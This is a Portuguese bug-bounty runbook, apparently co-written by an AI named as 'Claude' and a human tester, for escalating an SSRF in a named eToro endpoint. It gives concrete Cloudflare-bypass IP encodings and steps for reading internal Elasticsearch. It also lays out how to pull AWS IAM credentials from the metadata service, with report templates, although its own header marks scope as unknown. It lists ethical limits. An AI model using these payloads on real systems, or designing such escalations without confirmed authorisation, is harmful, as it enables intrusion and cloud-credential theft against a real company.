---
program_id: etoro
document_type: note
claimed_scope_status: unknown
classification: internal
source: bugcrowd policy (etoro) — 2026-09-09
collected_at: 2026-09-12T00:00:00Z
tags: [etoro, recon]
asset_refs: [etoro.com]
---
# Runbook — Escalada SSRF edm-streams

> **Estado:** Planejamento hipotético (reach não confirmado ainda).
> **Autoria:** Claude (desenho) + Tiago (execução).
> **Regras ativas:** Postura escudo, header `X-Bug-Bounty: moldret`, serial/sem-fuzz.

## Prerequisito: reach_test.py passou

```bash
python3 recon/ssrf/reach_test.py
```

Espera:
- **Controle A (externo):** `[APP-JSON]` em example.com ✓
- **Controle B (literal):** `[CLOUDFLARE-403]` em 127.0.0.1 ✓
- **Qualquer bypass:** `[APP-JSON]` em loopback (ex.: 2130706433, nip.io, etc.) ✓

Se tudo passou → **BYPASS_WRAP do WAF confirmado**. Anota qual variante deu `APP-JSON`
(ex.: `"2130706433"`, `"127.0.0.1.nip.io"`) — vai precisar nos Degraus 1–2.

## Checklist — pré-escalada

- [ ] `reach_test.py` retornou `APP-JSON` num alvo loopback (qual wrap? ________________)
- [ ] `etoro_session.py` preenchido com a tua sessão + header `X-Bug-Bounty: moldret`
- [ ] `pip install curl_cffi requests` ok
- [ ] Entendi a postura: serial, sleep, lista curada (nada de varrer 1000 portas)

---

## Fluxo de execução (passo-a-passo)

### DEGRAU 1 — Provar LEITURA de corpo interno

**Objetivo:** Subir do "reach-only" (SSRF só-DNS) para "leitura de corpo" = Data breach.
**Critério de sucesso:** `title`/`description` refletindo corpo de serviço interno distinto.

```bash
# Editar o arquivo pra pôr o BYPASS_WRAP que passou
# Ex.: BYPASS_WRAP = "2130706433" (se decimal foi o que deu APP-JSON no reach_test)
nano recon/ssrf/escalation-degrau1.py

# Rodar
python3 recon/ssrf/escalation-degrau1.py
```

**Esperar:**
```
[200] Elasticsearch (port 9200)  (...) [APP-JSON] 🎯 CORPO REFLETIDO | {"name":"...","cluster_name":"..."}
```

**Se encontrou `🎯 CORPO REFLETIDO`:**
- ✅ **LEITURA confirmada** = Degrau 1 OK, pode reportar como-é (High/Critical conforme o corpo).
- Opcionalmente, siga pra Degrau 2 (tentar AWS IMDS pra elevar a Critical).

**Se não encontrou:**
- ⚠️ Lista de portas pode estar errada ou serviço não roda naquele host.
- Opções: (a) repita com porta extra manualmente, (b) pule pro Degrau 2.

### DEGRAU 2 — AWS IMDS (credencial IAM) 🔴 TERMINAL

**Objetivo:** Roubar credencial IAM = Critical (impacto terminal — PARE E REPORTE).
**Critério de sucesso:** `title`/`description` refletindo `AccessKeyId`/`SecretAccessKey`/`Token`.

```bash
# Editar pra BYPASS_WRAP_IP = encoding de 169.254.169.254 no MESMO esquema do reach_test
# Ex.: se foi decimal (2130706433 pro 127.0.0.1), usa decimal pro 169.254.169.254 também:
# 169.254.169.254 em decimal = 2852039166
nano recon/ssrf/escalation-degrau2.py

# Rodar
python3 recon/ssrf/escalation-degrau2.py
```

**Esperar (ordem, pré-requisitos):**
1. STEP 1 (IMDS root): `[200]` ou `[404]` = IMDS alcançável
2. STEP 2 (roles): retorna nomes de role
3. STEP 3 (credenciais): `🔴 CRÍTICO! CREDENCIAL REFLETIDA`

**Se encontrou `🔴 CRÍTICO`:**
- ✅ **TERMINAL** — impacto máximo, PARE aqui.
- Redija a credencial real (AccessKeyId/Token) no report como prova.
- **NUNCA** use a credencial (só prova que existe).

**Se STEP 1 falhar (403 edge):**
- ❌ IMDS não alcançável ou encoding errado.
- Tente Degrau 3 (serviços internos em outra hora).

**Se STEP 2/3 retornam 404:**
- ⚠️ Host fora de EC2 ou pod sem role IAM.
- Tente Degrau 3 (serviços internos).

---

## Redação pro report (template)

### Se alcançou Degrau 1 (leitura + corpo refletido):

```markdown
## Prova de conceito

Endpoint: GET /api/edm-streams/v1/attachment?url=<URL>

1. **Baseline:** /attachment?url=http://example.com/ → [200] JSON refletindo title/host
   (prova: SSRF sem allow-list)

2. **Bypass:** /attachment?url=http://2130706433:9200/ → [200] JSON refletindo
   "cluster_name": "...", "version": {"number": "..."}
   (prova: edge WAF contornado, fetcher alcançou Elasticsearch interno)

## Impacto

- SSRF com canal de leitura: acesso a serviços internos (Elasticsearch exposto)
- Qualquer serviço interno com corpo pode ser lido: PII/segredos possíveis
- Severidade: **High** (acesso interno confirmado)
```

### Se alcançou Degrau 2 (credencial):

```markdown
## Prova de conceito

[STEP 1] /attachment?url=http://2852039166/latest/meta-data/ → [200] (IMDS alcançável)
[STEP 2] /attachment?url=http://2852039166/latest/meta-data/iam/security-credentials/
        → [200] "etoro-prod-role" (role encontrada)
[STEP 3] /attachment?url=http://2852039166/latest/meta-data/iam/security-credentials/etoro-prod-role/
        → [200] {
          "Code": "Success",
          "AccessKeyId": "AKIA...",
          "SecretAccessKey": "...",
          "Token": "...",
          "Expiration": "..."
        }

## Impacto

- **Critical:** Roubo de credencial AWS (acesso ao cloud — S3, KMS, RDS, etc.)
- Este é o degrau terminal — credenciais vivas = acesso direto à infra da eToro
- Severidade: **Critical** (acesso cloud confirmado)
```

---

## Troubleshooting

| Problema | Causa | Solução |
|----------|-------|---------|
| `ModuleNotFoundError: etoro_session` | `etoro_session.py` não existe | Copia `etoro_session.example.py` → `etoro_session.py` e preenche |
| Todos os degraus retornam `CLOUDFLARE-403` | BYPASS_WRAP errado | Confirma qual wrap passou no `reach_test.py`, adapta nos scripts |
| Timeout em tudo | Sessão expirada | Roda `reach_test.py` pra validar sessão antes de escalar |
| Elasticsearch não aparece na lista | Porta 9200 não roda naquele host | Lista é curada, mas pode estar desatualizada — tenta `curl 127.0.0.1:9200` direto (se conseguir shell interno) |
| IMDS retorna 404 em tudo | Host não é EC2 (fora da AWS) | Pula pro Degrau 3 ou outro provedor cloud (GCP/Azure — mas bloqueados sem header custom) |

---

## Gates éticas (não furar)

✅ Alcançar IMDS e refletir credencial = parar e reportar (impacto terminal)
✅ Refletir corpo de serviço interno = reportar (já é Data breach)
❌ **NÃO dumpar** índice inteiro do Elasticsearch (só prova que reflete — ex.: cluster_name)
❌ **NÃO usar** credencial roubada (só prova que existe)
❌ **NÃO varrer** 1000 portas (postura escudo: lista curada, serial)

---

## Próximos passos (Degrau 3+)

Se Degrau 2 falhar (sem IMDS ou sem credencial):
- **Degrau 3:** Serviços internos curados (painéis/admin sem auth ligado a loopback)
- **Degrau 4:** DNS-rebind/redirect (só se o app tiver guard pós-resolução — P5)

Documentados em `escalation-plan.md`.
